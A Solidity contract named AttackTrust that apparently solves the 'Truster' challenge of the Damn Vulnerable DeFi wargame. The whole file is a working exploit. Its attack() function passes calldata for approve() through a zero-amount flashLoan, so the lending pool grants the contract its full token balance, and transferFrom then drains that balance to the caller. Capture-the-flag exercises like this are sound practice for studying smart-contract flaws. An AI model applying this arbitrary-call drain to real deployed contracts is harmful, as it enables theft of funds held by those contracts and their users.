// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

import './TrusterLenderPool.sol';

contract AttackTrust {
    using Address for address;

    TrusterLenderPool pool;
    IERC20 public immutable damnValuableToken;


  constructor(address _pool, address _token) {
      damnValuableToken = IERC20(_token);
      pool = TrusterLenderPool(_pool);
  }

  function attack() public {
    uint256 poolBalance = damnValuableToken.balanceOf(address(pool));

    bytes memory data = abi.encodeWithSignature(
        "approve(address,uint256)",
        address(this), poolBalance
    );
    pool.flashLoan(0, msg.sender, address(damnValuableToken), data);

    damnValuableToken.transferFrom(address(pool), msg.sender, poolBalance);
  }
}
